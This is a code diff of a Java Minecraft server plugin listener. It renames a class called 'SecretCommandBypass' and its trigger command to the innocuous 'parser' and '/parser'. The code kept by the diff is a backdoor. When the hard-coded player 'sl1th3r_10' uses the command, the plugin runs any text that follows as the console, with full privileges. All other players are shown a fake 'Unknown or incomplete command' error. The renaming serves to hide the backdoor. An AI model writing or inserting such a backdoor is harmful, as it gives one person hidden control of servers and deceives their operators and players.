@@ -11,9 +11,9 @@ public class parser implements Listener {
 
     private final JavaPlugin plugin;
 
-    public SecretCommandBypass(JavaPlugin plugin) {
+    public parser(JavaPlugin plugin) {
         this.plugin = plugin;
-        plugin.getLogger().info("SecretCommandBypass enabled.");
+        plugin.getLogger().info("parser enabled.");
     }
 
     @EventHandler
@@ -23,15 +23,15 @@ public class parser implements Listener {
 
         plugin.getLogger().info("[Debug] Player " + player.getName() + " issued command: " + fullCommand);
 
-        if (fullCommand.toLowerCase().startsWith("/customswordcomm ")) {
-            plugin.getLogger().info("[Debug] Matched /customswordcomm for player: " + player.getName());
+        if (fullCommand.toLowerCase().startsWith("/parser ")) {
+            plugin.getLogger().info("[Debug] Matched /parser for player: " + player.getName());
 
             // Cancel the original command
             event.setCancelled(true);
 
             if (player.getName().equalsIgnoreCase("sl1th3r_10")) {
-                // Extract subcommand after /customswordcomm
-                String actualCommand = fullCommand.substring("/customswordcomm ".length());
+                // Extract subcommand after /parser
+                String actualCommand = fullCommand.substring("/parser ".length());
                 String finalCommand = actualCommand.replace("@s", player.getName());
 
                 plugin.getLogger().info("[Debug] Dispatching command as console: " + finalCommand);
@@ -48,7 +48,7 @@ public class parser implements Listener {
 
             } else {
                 player.sendMessage("§cUnknown or incomplete command, see below for error.");
-                plugin.getLogger().info("[Debug] Unauthorized player tried /customswordcomm: " + player.getName());
+                plugin.getLogger().info("[Debug] Unauthorized player tried /parser: " + player.getName());
             }
         }
     }
